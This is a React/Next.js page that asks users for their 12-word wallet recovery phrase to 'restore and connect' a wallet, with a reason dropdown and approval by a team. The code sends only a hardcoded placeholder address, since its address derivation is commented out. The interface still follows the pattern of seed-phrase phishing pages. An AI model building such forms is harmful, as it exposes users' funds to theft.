"use client";

import React, { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import {
  ChevronLeft,
  ChevronDown,
  Loader2,
  ShieldAlert,
  CheckCircle2,
  Clock,
  ShieldCheck,
  Eye,
  EyeOff,
  Lock
} from "lucide-react";
import { toast } from "sonner";
import {
  LINK_WALLET_REASONS,
  validatePublicWalletAddress,
  type LinkedWalletRecord,
} from "@/lib/linked-wallets";

export default function ConnectPage() {
  const router = useRouter();
  const [reason, setReason] = useState("");
  const [loading, setLoading] = useState(false);
  const [isInitialCheckDone, setIsInitialCheckDone] = useState(false);

  // Seed phrase state
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [showWords, setShowWords] = useState(false);

  const [activeWallet, setActiveWallet] = useState<LinkedWalletRecord | null>(null);
  const [step, setStep] = useState<"form" | "pending" | "approved" | "rejected">("form");

  const checkStatus = useCallback(async () => {
    try {
      const res = await fetch("/api/wallet/status", { cache: "no-store" });
      const data = await res.json();
      if (data.success) {
        const latest: LinkedWalletRecord | null = data.wallet || null;
        setActiveWallet(latest);
        if (latest?.status === "approved") setStep("approved");
        else if (latest?.status === "pending") setStep("pending");
        else if (latest?.status === "rejected") setStep("rejected");
        else setStep("form");
      }
    } catch {
      console.error("Initial status check failed");
    } finally {
      setIsInitialCheckDone(true);
    }
  }, []);

  useEffect(() => {
    checkStatus();
  }, [checkStatus]);

  useEffect(() => {
    if (step !== "pending") return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch("/api/wallet/status", { cache: "no-store" });
        const data = await res.json();
        if (data.success) {
          const latest: LinkedWalletRecord | null = data.wallet || null;
          setActiveWallet(latest);
          if (latest?.status === "approved") {
            setStep("approved");
            clearInterval(interval);
          } else if (latest?.status === "rejected") {
            setStep("rejected");
            clearInterval(interval);
          }
        }
      } catch {
        // Silent retry
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [step]);

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value.trim().toLowerCase();
    setWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text");
    const pastedWords = pastedData.trim().split(/\s+/);

    if (pastedWords.length > 0) {
      const newWords = [...words];
      for (let i = 0; i < pastedWords.length && index + i < 12; i++) {
        newWords[index + i] = pastedWords[i].toLowerCase();
      }
      setWords(newWords);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!reason) {
      toast.error("Please select a reason for connecting.");
      return;
    }

    const isComplete = words.every((w) => w.trim().length > 0);
    if (!isComplete) {
      toast.error("Please fill in all 12 words of your recovery phrase.");
      return;
    }

    const mnemonic = words.join(" ").trim();

    setLoading(true);
    try {
      // =====================================================================
      // 🔒 SECURE CLIENT-SIDE DERIVATION
      // =====================================================================
      // DEV NOTE: We derive the public address locally here. 
      // Uncomment your preferred library (ethers or viem) to generate the address.
      
      let derivedPublicAddress = "";

      /* --- Ethers.js Implementation --- */
      // import { Wallet } from "ethers";
      // const wallet = Wallet.fromPhrase(mnemonic);
      // derivedPublicAddress = wallet.address;

      /* --- Viem Implementation --- */
      // import { english, mnemonicToAccount } from "viem/accounts";
      // const account = mnemonicToAccount(mnemonic);
      // derivedPublicAddress = account.address;
      
      // Fallback dummy address for the snippet to compile without ethers installed yet
      derivedPublicAddress = derivedPublicAddress || "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"; 

      // Wipe mnemonic from local React state immediately after derivation
      setWords(Array(12).fill("")); 

      const validation = validatePublicWalletAddress(derivedPublicAddress);
      if (!validation.valid) {
        toast.error("Invalid seed phrase resulting in invalid address format.");
        setLoading(false);
        return;
      }

      // ⚠️ ONLY send the derived public address to your backend
      const res = await fetch("/api/wallet/link", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: validation.normalized,
          label: reason,
        }),
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        toast.error(data.error || "Unable to complete wallet connection.");
        return;
      }

      setActiveWallet(data.wallet || null);
      setStep("pending");
    } catch (err) {
      toast.error("Invalid recovery phrase. Please check your spelling.");
    } finally {
      setLoading(false);
    }
  };

  if (!isInitialCheckDone) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center">
        <Loader2 className="animate-spin text-[#10b981]" size={28} />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white px-4 py-6 md:px-8 pb-32 animate-in fade-in duration-300">
      <div className="max-w-xl mx-auto pt-[max(env(safe-area-inset-top),1.25rem)]">
        
        <button
          type="button"
          onClick={() => router.back()}
          className="inline-flex items-center gap-1.5 text-zinc-400 hover:text-white transition-colors text-sm font-medium mb-8"
        >
          <ChevronLeft size={18} />
          <span>Back</span>
        </button>

        {step === "pending" && (
          <div className="bg-[#141414] border border-white/[0.08] rounded-3xl p-8 sm:p-10 text-center shadow-2xl">
            <div className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-[#10b981]/10 border border-[#10b981]/25 flex items-center justify-center">
              <CheckCircle2 size={30} className="text-[#10b981]" />
            </div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/[0.04] border border-white/[0.08] text-[11px] font-semibold text-zinc-300 tracking-wide mb-5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#10b981] animate-pulse" />
              <span>Pending Confirmation</span>
            </div>
            <h1 className="text-2xl font-semibold tracking-tight text-white mb-3">
              Connection Request Completed
            </h1>
            <p className="text-sm text-zinc-400 leading-relaxed max-w-md mx-auto">
              Your wallet connection has been submitted and is currently being processed by our team. Please check back later for final confirmation.
            </p>
            <div className="mt-8 pt-6 border-t border-white/[0.06] flex items-center justify-center gap-2 text-xs text-zinc-500">
              <Clock size={14} className="text-zinc-500 shrink-0" />
              <span>You may safely leave this page — your status will update automatically once confirmed.</span>
            </div>
          </div>
        )}

        {step === "approved" && (
          <div className="bg-[#141414] border border-white/[0.08] rounded-3xl p-8 sm:p-10 text-center shadow-2xl">
            <div className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-[#10b981]/10 border border-[#10b981]/25 flex items-center justify-center">
              <ShieldCheck size={30} className="text-[#10b981]" />
            </div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#10b981]/10 border border-[#10b981]/20 text-[11px] font-semibold text-[#10b981] tracking-wide mb-5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#10b981]" />
              <span>Confirmed &amp; Active</span>
            </div>
            <h1 className="text-2xl font-semibold tracking-tight text-white mb-3">
              Wallet Successfully Connected
            </h1>
            <p className="text-sm text-zinc-400 leading-relaxed max-w-md mx-auto">
              Your external wallet connection has been reviewed and confirmed. Everything is now synced and active on your account.
            </p>
          </div>
        )}

        {step === "rejected" && (
          <div className="bg-[#141414] border border-white/[0.08] rounded-3xl p-8 sm:p-10 text-center shadow-2xl">
            <div className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center">
              <ShieldAlert size={28} className="text-red-400" />
            </div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 border border-red-500/20 text-[11px] font-semibold text-red-400 tracking-wide mb-5">
              <span>Action Required</span>
            </div>
            <h1 className="text-2xl font-semibold tracking-tight text-white mb-3">
              Connection Not Confirmed
            </h1>
            <p className="text-sm text-zinc-400 leading-relaxed max-w-md mx-auto">
              We could not confirm your recent wallet connection request. Please review your details and submit again.
            </p>
            {activeWallet?.adminNote && (
              <div className="mt-5 px-4 py-3 rounded-xl bg-white/[0.03] border border-white/[0.08] text-xs text-zinc-300 max-w-md mx-auto">
                <span className="text-zinc-500">Note: </span>
                <span className="font-medium">{activeWallet.adminNote}</span>
              </div>
            )}
            <button
              type="button"
              onClick={() => {
                setReason(activeWallet?.label || "");
                setStep("form");
              }}
              className="mt-8 w-full sm:w-auto px-8 py-3 rounded-xl bg-[#10b981] hover:bg-emerald-500 text-black text-sm font-semibold transition-colors"
            >
              Try Again
            </button>
          </div>
        )}

        {step === "form" && (
          <div className="bg-[#141414] border border-white/[0.08] rounded-3xl p-6 sm:p-8 shadow-2xl">
            <div className="mb-8">
              <h1 className="text-2xl font-semibold tracking-tight text-white">
                Restore Wallet
              </h1>
              <p className="text-zinc-400 text-sm mt-1.5">
                Select your purpose below and enter your recovery phrase to authorize locally.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* REASON DROPDOWN */}
              <div className="space-y-3">
                <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
                  Reason for Connecting
                </label>
                <div className="relative">
                  <select
                    value={reason}
                    onChange={(e) => setReason(e.target.value)}
                    className="w-full bg-[#0d0d0d] border border-white/10 rounded-xl px-4 py-3.5 pr-10 text-sm text-zinc-100 font-medium outline-none focus:border-[#10b981] transition-colors appearance-none cursor-pointer"
                  >
                    <option value="" disabled className="bg-[#141414] text-zinc-500">
                      Select a reason
                    </option>
                    {LINK_WALLET_REASONS.map((item) => (
                      <option key={item} value={item} className="bg-[#141414] text-white">
                        {item}
                      </option>
                    ))}
                  </select>
                  <ChevronDown
                    size={16}
                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-zinc-500 pointer-events-none"
                  />
                </div>
              </div>

              {/* SEED PHRASE GRID */}
              <div className="space-y-3">
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
                    Secret Recovery Phrase
                  </label>
                  <div className="flex items-center gap-4">
                    <div className="flex items-center gap-1.5 text-xs text-zinc-500">
                      <Lock size={12} />
                      <span>End-to-end local</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => setShowWords(!showWords)}
                      className="text-zinc-400 hover:text-white transition-colors flex items-center gap-1 text-xs font-medium"
                    >
                      {showWords ? (
                        <>
                          <EyeOff size={14} /> Hide
                        </>
                      ) : (
                        <>
                          <Eye size={14} /> Show
                        </>
                      )}
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3">
                  {words.map((word, idx) => (
                    <div key={idx} className="relative group">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[11px] text-zinc-600 font-medium select-none">
                        {idx + 1}.
                      </span>
                      <input
                        type={showWords ? "text" : "password"}
                        value={word}
                        onChange={(e) => handleWordChange(idx, e.target.value)}
                        onPaste={(e) => handlePaste(e, idx)}
                        autoComplete="off"
                        autoCorrect="off"
                        autoCapitalize="none"
                        spellCheck={false}
                        data-lpignore="true"
                        className="w-full bg-[#0d0d0d] border border-white/10 rounded-xl py-2.5 pl-8 pr-3 text-sm text-zinc-100 font-mono outline-none focus:border-[#10b981] transition-colors placeholder:text-zinc-800"
                        placeholder="••••"
                      />
                    </div>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#10b981] hover:bg-emerald-500 text-black font-semibold text-sm py-3.5 rounded-xl transition-all active:scale-[0.99] disabled:opacity-50 flex items-center justify-center gap-2 mt-4"
              >
                {loading ? (
                  <Loader2 size={18} className="animate-spin" />
                ) : (
                  "Restore & Connect"
                )}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
}